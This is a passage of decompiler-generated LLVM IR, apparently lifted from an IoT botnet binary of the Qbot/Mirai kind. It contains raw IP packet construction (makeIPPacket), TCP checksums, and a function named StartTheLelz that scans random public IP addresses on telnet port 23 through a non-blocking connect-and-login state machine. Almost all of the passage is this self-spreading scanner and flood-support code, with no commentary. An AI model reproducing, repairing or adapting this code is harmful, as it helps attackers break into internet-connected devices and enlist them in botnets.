  %v3_aee445 = phi i32 [ %v3_aee4, %dec_label_pc_ae7c ], [ %v3_aee440, %dec_label_pc_aecc.preheader ]
  %v2_aedc44 = phi i32 [ %v2_aedc, %dec_label_pc_ae7c ], [ %v2_aedc39, %dec_label_pc_aecc.preheader ]
  %v3_aef843 = phi i32 [ %v2_aebc, %dec_label_pc_ae7c ], [ %v3_aef8.ph, %dec_label_pc_aecc.preheader ]
  %v2_ae90 = urem i32 %v3_aef843, 65536
  %v2_aebc = add i32 %v2_aedc44, %v2_ae90
  %v3_aebc = icmp ult i32 %v2_aebc, %v2_ae90
  %v4_aec0 = zext i1 %v3_aebc to i32
  %v5_aec0 = add nuw nsw i32 %v4_aec0, %v3_aee445
  %v3_aed0 = mul i32 %v5_aec0, 65536
  %v3_aed8 = udiv i32 %v2_aebc, 65536
  %v2_aedc = or i32 %v3_aed0, %v3_aed8
  %v3_aee4 = udiv i32 %v5_aec0, 65536
  %v2_aeec = or i32 %v2_aedc, %v3_aee4
  %v2_aef0 = icmp eq i32 %v2_aeec, 0
  br i1 %v2_aef0, label %dec_label_pc_aecc.dec_label_pc_aef8_crit_edge, label %dec_label_pc_ae7c

dec_label_pc_aecc.dec_label_pc_aef8_crit_edge:    ; preds = %dec_label_pc_ae7c
  br label %dec_label_pc_aef8

dec_label_pc_aef8:                                ; preds = %dec_label_pc_aecc.dec_label_pc_aef8_crit_edge, %dec_label_pc_aecc.preheader
  %v3_aef8.lcssa = phi i32 [ %v2_aebc, %dec_label_pc_aecc.dec_label_pc_aef8_crit_edge ], [ %v3_aef8.ph, %dec_label_pc_aecc.preheader ]
  %v1_af04 = urem i32 %v3_aef8.lcssa, 65536
  %v3_af0c = xor i32 %v1_af04, 65535
  ret i32 %v3_af0c

; uselistorder directives
  uselistorder i32 %v2_aedc, { 1, 0 }
  uselistorder i32 %v5_aec0, { 1, 0 }
  uselistorder i32 %v2_aebc, { 2, 0, 3, 1 }
  uselistorder i32 %v3_aee440, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_aef8.ph, { 2, 1, 0 }
  uselistorder i32 %v2_ae64, { 0, 2, 1 }
  uselistorder i32 %v1_ae30, { 0, 2, 1 }
  uselistorder i32 %v2_ae10, { 0, 2, 1 }
  uselistorder i32 %v2_ae0c, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ae7c, { 1, 0 }
  uselistorder label %dec_label_pc_adf8, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_af24 = load i32, i32* @fp, align 4
  store i32 44844, i32* %stack_var_-4, align 4
  %v2_af28 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_af28, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_af48 = add i32 %arg1, 12
  %v2_af48 = inttoptr i32 %v1_af48 to i32*
  %v3_af48 = load i32, i32* %v2_af48, align 4
  store i32 %v3_af48, i32* %stack_var_-44, align 4
  %v1_af70 = call i32 @__GI_htons(i32 20)
  %v1_af8c = call i32 @malloc(i32 32)
  %v2_af98 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_af98, i32* @r3, align 4
  store i32 %v1_af8c, i32* @r0, align 4
  store i32 %v2_af98, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_afa8 = call i32 @memcpy()
  %v1_afb0 = add i32 %v1_af8c, 12
  store i32 %v1_afb0, i32* @r3, align 4
  store i32 %v1_afb0, i32* @r0, align 4
  %v3_afb8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_afb8, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_afc0 = call i32 @memcpy()
  %v2_afcc = inttoptr i32 %v1_af8c to i16*
  %v3_afcc = call i32 @csum(i16* %v2_afcc, i32 32)
  %sext = mul i32 %v3_afcc, 65536
  %v1_afd0 = sdiv i32 %sext, 65536
  store i32 %v1_af8c, i32* @r0, align 4
  %v0_afdc = call i32 @free()
  %v4_afe0 = urem i32 %v1_afd0, 65536
  store i32 %v3_af24, i32* @fp, align 4
  ret i32 %v4_afe0

; uselistorder directives
  uselistorder i32 %v1_af8c, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_aff8 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_b064 = add i32 %tmp3, 1
  %v4_b064 = inttoptr i32 %v3_b064 to i8*
  store i8 0, i8* %v4_b064, align 1
  %v3_b068 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_b068, 20
  %v1_b084 = trunc i32 %fold to i16
  %v3_b084 = add i32 %tmp3, 2
  %v4_b084 = inttoptr i32 %v3_b084 to i16*
  store i16 %v1_b084, i16* %v4_b084, align 2
  %v0_b088 = call i32 @rand_cmwc()
  %v1_b09c = trunc i32 %v0_b088 to i16
  %v3_b09c = add i32 %tmp3, 4
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v1_b09c, i16* %v4_b09c, align 2
  %v3_b0a8 = add i32 %tmp3, 6
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i16*
  store i16 0, i16* %v4_b0a8, align 2
  %v3_b0b4 = add i32 %tmp3, 8
  %v4_b0b4 = inttoptr i32 %v3_b0b4 to i8*
  store i8 -1, i8* %v4_b0b4, align 1
  %v3_b0c0 = add i32 %tmp3, 9
  %v4_b0c0 = inttoptr i32 %v3_b0c0 to i8*
  store i8 %tmp, i8* %v4_b0c0, align 1
  %v3_b0cc = add i32 %tmp3, 10
  %v4_b0cc = inttoptr i32 %v3_b0cc to i16*
  store i16 0, i16* %v4_b0cc, align 2
  %v2_b0d8 = add i32 %tmp3, 12
  %v3_b0d8 = inttoptr i32 %v2_b0d8 to i32*
  store i32 %arg3, i32* %v3_b0d8, align 4
  %v2_b0e4 = add i32 %tmp3, 16
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i32*
  store i32 %arg2, i32* %v3_b0e4, align 4
  store i32 %v3_aff8, i32* @fp, align 4
  ret i32 %v0_b088

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_b110 = icmp sgt i32 %arg1, 2
  br i1 %v8_b110, label %dec_label_pc_b120, label %dec_label_pc_b130

dec_label_pc_b120:                                ; preds = %entry
  %v1_b124 = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %entry, %dec_label_pc_b120
  %storemerge1 = phi i32 [ 0, %dec_label_pc_b120 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_b130, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_b148 = load i32, i32* @fp, align 4
  store i32 45392, i32* %stack_var_-4, align 4
  %v2_b14c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b14c, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_b16c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_b17c = icmp eq i32 %v1_b16c, 0
  br i1 %v2_b17c, label %dec_label_pc_b184, label %dec_label_pc_b190

dec_label_pc_b184:                                ; preds = %entry
  br label %dec_label_pc_b25c

dec_label_pc_b190:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_b194 = add i32 %v1_b16c, 16
  %v2_b194 = inttoptr i32 %v1_b194 to i32*
  %v3_b194 = load i32, i32* %v2_b194, align 4
  %v1_b198 = inttoptr i32 %v3_b194 to i32*
  %v2_b198 = load i32, i32* %v1_b198, align 4
  %v1_b1a0 = add i32 %v1_b16c, 12
  %v2_b1a0 = inttoptr i32 %v1_b1a0 to i32*
  %v3_b1a0 = load i32, i32* %v2_b1a0, align 4
  store i32 %v3_b1a0, i32* @r2, align 4
  %v2_b1ac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_b1ac, i32* @r3, align 4
  %v5_b1b8 = call i32 @bcopy(i32 %v2_b198, i32 %v2_b1ac, i32 %v3_b1a0, i32 %v2_b1ac, i32 %v1_b16c)
  %v2_b1c4 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_b1e4 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_b1f0 = ptrtoint i32* %stack_var_-44 to i32
  %v5_b20c = call i32 @__GI_setsockopt(i32 %v3_b1e4, i32 6, i32 1, i32 %v2_b1f0, i32 4)
  %v3_b214 = icmp eq i32 %v3_b1e4, -1
  br i1 %v3_b214, label %dec_label_pc_b21c, label %dec_label_pc_b228

dec_label_pc_b21c:                                ; preds = %dec_label_pc_b190
  br label %dec_label_pc_b25c

dec_label_pc_b228:                                ; preds = %dec_label_pc_b190
  %v2_b1a8 = ptrtoint i32* %stack_var_-40 to i32
  %v3_b238 = call i32 @__libc_connect(i32 %v3_b1e4, i32 %v2_b1a8, i32 16)
  %v3_b240 = icmp eq i32 %v3_b238, -1
  br i1 %v3_b240, label %dec_label_pc_b248, label %dec_label_pc_b254

dec_label_pc_b248:                                ; preds = %dec_label_pc_b228
  br label %dec_label_pc_b25c

dec_label_pc_b254:                                ; preds = %dec_label_pc_b228
  br label %dec_label_pc_b25c

dec_label_pc_b25c:                                ; preds = %dec_label_pc_b248, %dec_label_pc_b21c, %dec_label_pc_b184, %dec_label_pc_b254
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b184 ], [ 0, %dec_label_pc_b21c ], [ 0, %dec_label_pc_b248 ], [ %v3_b1e4, %dec_label_pc_b254 ]
  store i32 %v3_b148, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_b25c, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b270 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b270, i32* %ip.global-to-local, align 4
  %v3_b274 = load i32, i32* @r4, align 4
  store i32 %v3_b274, i32* %stack_var_-24, align 4
  store i32 45692, i32* %stack_var_-4, align 4
  %v19_b274 = ptrtoint i32* %stack_var_-24 to i32
  %v2_b278 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b278, i32* @fp, align 4
  %v2_b294 = call i32 @__GI_time(i32* null)
  store i32 %v2_b294, i32* @r4, align 4
  %v0_b2a0 = call i32 @rand_cmwc()
  %v0_b2a8 = load i32, i32* @r4, align 4
  %v2_b2a8 = xor i32 %v0_b2a8, %v0_b2a0
  %v1_b2b0 = call i32 @srand(i32 %v2_b2a8)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b2cc = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_b2fc = bitcast i32* %stack_var_-604 to i8*
  %v3_b2fc = call i32 @__GI_memset(i8* %v2_b2fc, i32 0)
  %v1_b308 = call i32 @malloc(i32 1025)
  store i32 1025, i32* @r2, align 4
  %v2_b324 = inttoptr i32 %v1_b308 to i8*
  %v3_b324 = call i32 @__GI_memset(i8* %v2_b324, i32 0)
  %v2_b334 = mul i32 %arg2, 28
  %v1_b33c = add i32 %v2_b334, 14
  %v3_b340 = and i32 %v1_b33c, -8
  %v1_b348 = load i32, i32* @sp, align 4
  %v2_b348 = sub i32 %v1_b348, %v3_b340
  %v1_b358 = add i32 %v2_b348, 15
  %v3_b35c = and i32 %v1_b358, -8
  %v2_b380 = mul i32 %arg2, 5
  store i32 %v2_b380, i32* @r2, align 4
  %v2_b390 = inttoptr i32 %v3_b35c to i8*
  %v3_b390 = call i32 @__GI_memset(i8* %v2_b390, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_b43056 = icmp sgt i32 %arg2, 0
  br i1 %v5_b43056, label %dec_label_pc_b3a0, label %dec_label_pc_b434

dec_label_pc_b3a0:                                ; preds = %entry, %dec_label_pc_b3a0
  %storemerge457 = phi i32 [ %v1_b41c, %dec_label_pc_b3a0 ], [ 0, %entry ]
  %v2_b3b0 = mul i32 %storemerge457, 28
  %v2_b3b4 = add i32 %v2_b3b0, %v3_b35c
  store i32 28, i32* @r2, align 4
  %v2_b3c4 = inttoptr i32 %v2_b3b4 to i8*
  %v3_b3c4 = call i32 @__GI_memset(i8* %v2_b3c4, i32 0)
  %v3_b3ec = add i32 %v2_b3b4, 9
  %v4_b3ec = inttoptr i32 %v3_b3ec to i8*
  store i8 1, i8* %v4_b3ec, align 1
  %v2_b40c = add i32 %v2_b3b4, 24
  %v2_b414 = inttoptr i32 %v2_b40c to i32*
  store i32 %v1_b308, i32* %v2_b414, align 4
  %v1_b41c = add nuw nsw i32 %storemerge457, 1
  store i32 %v1_b41c, i32* %r2.global-to-local, align 4
  %v5_b430 = icmp slt i32 %v1_b41c, %arg2
  br i1 %v5_b430, label %dec_label_pc_b3a0, label %dec_label_pc_b434

dec_label_pc_b434:                                ; preds = %dec_label_pc_b3a0, %entry
  br label %dec_label_pc_b43c

dec_label_pc_b43c:                                ; preds = %dec_label_pc_b43c, %dec_label_pc_b434
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_b434 ], [ %v1_b440, %dec_label_pc_b43c ]
  %v1_b440 = add i32 %stack_var_-56.0, 1
  store i32 %v1_b440, i32* %r2.global-to-local, align 4
  %v4_b450 = mul i32 %v1_b440, 4
  %v5_b450 = add i32 %v4_b450, ptrtoint ([10 x i8*]* @global_var_26174.89 to i32)
  %v6_b450 = inttoptr i32 %v5_b450 to i32*
  %v7_b450 = load i32, i32* %v6_b450, align 4
  %v2_b454 = icmp eq i32 %v7_b450, 0
  br i1 %v2_b454, label %dec_label_pc_b45c.preheader, label %dec_label_pc_b43c

dec_label_pc_b45c.preheader:                      ; preds = %dec_label_pc_b43c
  %v2_b4e4 = add i32 %v3_b35c, 8
  %v2_b7e4 = or i32 %v3_b35c, 4
  %v2_b8c4 = ptrtoint i32* %stack_var_-612 to i32
  %v2_b944 = ptrtoint i32* %stack_var_-324 to i32
  %v2_ba40 = ptrtoint i32* %stack_var_-332 to i32
  %v2_ba9c = ptrtoint i32* %stack_var_-340 to i32
  %v2_baa0 = ptrtoint i32* %stack_var_-336 to i32
  %v2_bbbc = add i32 %v3_b35c, 16
  %v2_bc38 = add i32 %v3_b35c, 24
  br label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b45c, %dec_label_pc_c5b8, %dec_label_pc_b45c.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v5_b43056, label %dec_label_pc_b468, label %dec_label_pc_b45c

dec_label_pc_b468:                                ; preds = %dec_label_pc_b45c, %dec_label_pc_c5b8
  %storemerge548 = phi i32 [ %v1_c5bc, %dec_label_pc_c5b8 ], [ 0, %dec_label_pc_b45c ]
  %v3_b474 = mul i32 %storemerge548, 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_b47c = mul i32 %storemerge548, 28
  %v2_b480 = add i32 %v2_b47c, %v3_b35c
  %v2_b484 = add i32 %v2_b480, 16
  %v1_b488 = inttoptr i32 %v2_b484 to i32*
  %v2_b488 = load i32, i32* %v1_b488, align 4
  %v2_b48c = icmp eq i32 %v2_b488, 0
  br i1 %v2_b48c, label %dec_label_pc_b494, label %dec_label_pc_b4cc

dec_label_pc_b494:                                ; preds = %dec_label_pc_b468
  store i32 %storemerge548, i32* @r4, align 4
  %v2_b49c = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b4b0 = load i32, i32* @r4, align 4
  %v3_b4b4 = mul i32 %v0_b4b0, 4
  store i32 %v3_b4b4, i32* %r2.global-to-local, align 4
  %v2_b4bc = mul i32 %v0_b4b0, 28
  %v2_b4c4 = add i32 %v2_bbbc, %v2_b4bc
  %v2_b4c8 = inttoptr i32 %v2_b4c4 to i32*
  store i32 %v2_b49c, i32* %v2_b4c8, align 4
  br label %dec_label_pc_b4cc

dec_label_pc_b4cc:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b494
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_b4e8 = add i32 %v2_b4e4, %v2_b47c
  %v1_b4ec = inttoptr i32 %v2_b4e8 to i8*
  %v2_b4ec = load i8, i8* %v1_b4ec, align 4
  %v3_b4ec = sext i8 %v2_b4ec to i32
  switch i32 %v3_b4ec, label %dec_label_pc_c5b8 [
    i32 0, label %dec_label_pc_b51c
    i32 1, label %dec_label_pc_b958.lr.ph
    i32 2, label %dec_label_pc_bc04
    i32 3, label %dec_label_pc_bd50
    i32 4, label %dec_label_pc_bea4
    i32 5, label %dec_label_pc_bff0
    i32 6, label %dec_label_pc_c144
    i32 7, label %dec_label_pc_c448
  ]

dec_label_pc_b51c:                                ; preds = %dec_label_pc_b4cc
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_b538 = add i32 %v2_b480, 8
  %v1_b53c = add i32 %v2_b480, 9
  %v2_b53c = inttoptr i32 %v1_b53c to i8*
  %v3_b53c = load i8, i8* %v2_b53c, align 1
  %v7_b540 = icmp eq i8 %v3_b53c, 1
  br i1 %v7_b540, label %dec_label_pc_b548, label %dec_label_pc_b5f4

dec_label_pc_b548:                                ; preds = %dec_label_pc_b51c
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_b564 = add i32 %v2_b480, 24
  %v1_b568 = inttoptr i32 %v2_b564 to i32*
  %v2_b568 = load i32, i32* %v1_b568, align 4
  store i32 28, i32* @r2, align 4
  %v2_b594 = inttoptr i32 %v2_b480 to i8*
  %v3_b594 = call i32 @__GI_memset(i8* %v2_b594, i32 0)
  store i32 %v2_b564, i32* %r2.global-to-local, align 4
  store i32 %v2_b568, i32* %v1_b568, align 4
  store i32 %storemerge548, i32* @r4, align 4
  %v4_b5c4 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_b35c, i32 %v2_b564, i32 %v2_b568)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5d4 = load i32, i32* @r4, align 4
  %v3_b5d8 = mul i32 %v0_b5d4, 4
  store i32 %v3_b5d8, i32* %r2.global-to-local, align 4
  %v2_b5e0 = mul i32 %v0_b5d4, 28
  %v2_b5e8 = add i32 %v2_b7e4, %v2_b5e0
  %v2_b5ec = inttoptr i32 %v2_b5e8 to i32*
  store i32 %v4_b5c4, i32* %v2_b5ec, align 4
  br label %dec_label_pc_b780

dec_label_pc_b5f4:                                ; preds = %dec_label_pc_b51c
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_b614 = load i8, i8* %v2_b53c, align 1
  %v2_b618 = icmp eq i8 %v3_b614, 0
  br i1 %v2_b618, label %dec_label_pc_b620, label %dec_label_pc_b780

dec_label_pc_b620:                                ; preds = %dec_label_pc_b5f4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_b644 = add i32 %v2_b480, 11
  %v2_b644 = inttoptr i32 %v1_b644 to i8*
  %v3_b644 = load i8, i8* %v2_b644, align 1
  %v1_b648 = add i8 %v3_b644, 1
  store i8 %v1_b648, i8* %v2_b644, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_b69c = add i32 %v2_b480, 10
  %v2_b69c = inttoptr i32 %v1_b69c to i8*
  %v3_b69c = load i8, i8* %v2_b69c, align 2
  %v1_b6a0 = add i8 %v3_b69c, 1
  store i32 %v3_b35c, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_b6a0, i8* %v2_b69c, align 2
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_b6f0 = load i8, i8* %v2_b644, align 1
  %v7_b6f4 = icmp eq i8 %v3_b6f0, 9
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  br i1 %v7_b6f4, label %dec_label_pc_b6fc, label %dec_label_pc_b728

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b620
  store i32 %v2_b538, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_b53c, align 1
  br label %dec_label_pc_c5b8

dec_label_pc_b728:                                ; preds = %dec_label_pc_b620
  %v3_b748 = load i8, i8* %v2_b69c, align 2
  %v7_b74c = icmp eq i8 %v3_b748, 9
  br i1 %v7_b74c, label %dec_label_pc_b754, label %dec_label_pc_b780

dec_label_pc_b754:                                ; preds = %dec_label_pc_b728
  store i32 %v2_b538, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_b53c, align 1
  br label %dec_label_pc_c5b8

dec_label_pc_b780:                                ; preds = %dec_label_pc_b728, %dec_label_pc_b5f4, %dec_label_pc_b548
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b798 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_b7c8 = call i32 @__GI_memset(i8* %v2_b2fc, i32 0)
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  store i32 %storemerge548, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b804 = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_b80c = load i32, i32* @r4, align 4
  %v2_b818 = mul i32 %v0_b80c, 28
  %v2_b81c = add i32 %v2_b818, %v3_b35c
  %v2_b820 = inttoptr i32 %v2_b81c to i32*
  store i32 %v3_b804, i32* %v2_b820, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_b83c = inttoptr i32 %v2_b480 to i32*
  %v2_b83c = load i32, i32* %v1_b83c, align 4
  %v7_b840 = icmp eq i32 %v2_b83c, -1
  br i1 %v7_b840, label %dec_label_pc_c5b8, label %dec_label_pc_b848

dec_label_pc_b848:                                ; preds = %dec_label_pc_b780
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_b860 = load i32, i32* %v1_b83c, align 4
  store i32 %v2_b860, i32* @r4, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_b87c = load i32, i32* %v1_b83c, align 4
  store i32 %v2_b87c, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b88c = call i32 @__libc_fcntl(i32 %v2_b87c, i32 3)
  %v1_b894 = or i32 %v2_b88c, 2048
  store i32 %v1_b894, i32* @r3, align 4
  %v0_b898 = load i32, i32* @r4, align 4
  store i32 %v1_b894, i32* %r2.global-to-local, align 4
  %v2_b8a4 = call i32 @__libc_fcntl(i32 %v0_b898, i32 4)
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_b8c0 = load i32, i32* %v1_b83c, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_b8d4 = call i32 @__libc_connect(i32 %v2_b8c0, i32 %v2_b8c4, i32 16)
  %v3_b8dc = icmp eq i32 %v3_b8d4, -1
  br i1 %v3_b8dc, label %dec_label_pc_b8e4, label %dec_label_pc_b91c

dec_label_pc_b8e4:                                ; preds = %dec_label_pc_b848
  %v0_b8e4 = call i32 @__GI___errno_location()
  %v1_b8ec = inttoptr i32 %v0_b8e4 to i32*
  %v2_b8ec = load i32, i32* %v1_b8ec, align 4
  %v7_b8f0 = icmp eq i32 %v2_b8ec, 115
  br i1 %v7_b8f0, label %dec_label_pc_b91c, label %dec_label_pc_b8f8

dec_label_pc_b8f8:                                ; preds = %dec_label_pc_b8e4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_b914 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_b91c:                                ; preds = %dec_label_pc_b848, %dec_label_pc_b8e4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v3_b93c = call i32 @advance_state(i32* nonnull %v1_b83c, i32 1)
  br label %dec_label_pc_c5b8

dec_label_pc_b958.lr.ph:                          ; preds = %dec_label_pc_b4cc
  br label %dec_label_pc_b958

dec_label_pc_b958:                                ; preds = %dec_label_pc_b958.lr.ph, %dec_label_pc_b958
  %storemerge610 = phi i32 [ 0, %dec_label_pc_b958.lr.ph ], [ %v1_b96c, %dec_label_pc_b958 ]
  store i32 %v2_b944, i32* %r2.global-to-local, align 4
  %v5_b964 = mul nuw nsw i32 %storemerge610, 4
  %v6_b964 = add i32 %v5_b964, %v2_b944
  %v7_b964 = inttoptr i32 %v6_b964 to i32*
  store i32 0, i32* %v7_b964, align 4
  %v1_b96c = add nuw nsw i32 %storemerge610, 1
  %tmp39 = icmp ult i32 %v1_b96c, 32
  br i1 %tmp39, label %dec_label_pc_b958, label %dec_label_pc_b980

dec_label_pc_b980:                                ; preds = %dec_label_pc_b958
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v1_b998 = inttoptr i32 %v2_b480 to i32*
  %v2_b998 = load i32, i32* %v1_b998, align 4
  %v3_b99c = udiv i32 %v2_b998, 32
  %v3_b9b0 = mul nuw nsw i32 %v3_b99c, 4
  %v2_b9b8 = add i32 %v3_b9b0, %v19_b274
  store i32 %v2_b9b8, i32* %r2.global-to-local, align 4
  %v2_b9bc = add i32 %v2_b9b8, -300
  %v1_b9c0 = inttoptr i32 %v2_b9bc to i32*
  %v2_b9c0 = load i32, i32* %v1_b9c0, align 4
  store i32 %v2_b9c0, i32* %ip.global-to-local, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_b9dc = load i32, i32* %v1_b998, align 4
  %v1_b9e0 = urem i32 %v2_b9dc, 32
  %v6_b9e8 = shl i32 1, %v1_b9e0
  %v2_b9ec = or i32 %v6_b9e8, %v2_b9c0
  store i32 %v2_b9ec, i32* %v1_b9c0, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_ba34 = load i32, i32* %v1_b998, align 4
  %v1_ba38 = add i32 %v2_ba34, 1
  store i32 %v1_ba38, i32* %r2.global-to-local, align 4
  store i32 %v2_b944, i32* %ip.global-to-local, align 4
  %v1_ba44 = load i32, i32* @sp, align 4
  %v2_ba44 = inttoptr i32 %v1_ba44 to i32*
  store i32 %v2_ba40, i32* %v2_ba44, align 4
  %v0_ba48 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_b944, i32* %r2.global-to-local, align 4
  %v4_ba58 = load i32, i32* %stack_var_-332, align 4
  %v5_ba58 = call i32 @__libc_select(i32 %v0_ba48, i32 0, i32 %v2_b944, i32 0, i32 %v4_ba58)
  %v7_ba68 = icmp eq i32 %v5_ba58, 1
  br i1 %v7_ba68, label %dec_label_pc_ba70, label %dec_label_pc_bb74

dec_label_pc_ba70:                                ; preds = %dec_label_pc_b980
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_ba98 = load i32, i32* %v1_b998, align 4
  store i32 %v2_ba98, i32* %r2.global-to-local, align 4
  store i32 %v2_ba9c, i32* %ip.global-to-local, align 4
  %v1_baa4 = load i32, i32* @sp, align 4
  %v2_baa4 = inttoptr i32 %v1_baa4 to i32*
  store i32 %v2_baa0, i32* %v2_baa4, align 4
  %v0_baa8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_bab8 = load i32, i32* %stack_var_-340, align 4
  %v5_bab8 = call i32 @getsockopt(i32 %v0_baa8, i32 1, i32 4, i32 %v2_ba9c, i32 %v4_bab8)
  %v3_babc = load i32, i32* %stack_var_-340, align 4
  %v2_bac0 = icmp eq i32 %v3_babc, 0
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  br i1 %v2_bac0, label %dec_label_pc_baec, label %dec_label_pc_bac8

dec_label_pc_bac8:                                ; preds = %dec_label_pc_ba70
  %v3_bae4 = call i32 @reset_telstate(i32 %v2_b480, i32 %v3_b35c, i32 %v3_b474)
  br label %dec_label_pc_c5b8

dec_label_pc_baec:                                ; preds = %dec_label_pc_ba70
  %v2_bb04 = load i32, i32* %v1_b998, align 4
  store i32 %v2_bb04, i32* @r4, align 4
  store i32 %v3_b474, i32* %r2.global-to-local, align 4
  %v2_bb20 = load i32, i32* %v1_b998, align 4
  store i32 %v2_bb20, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
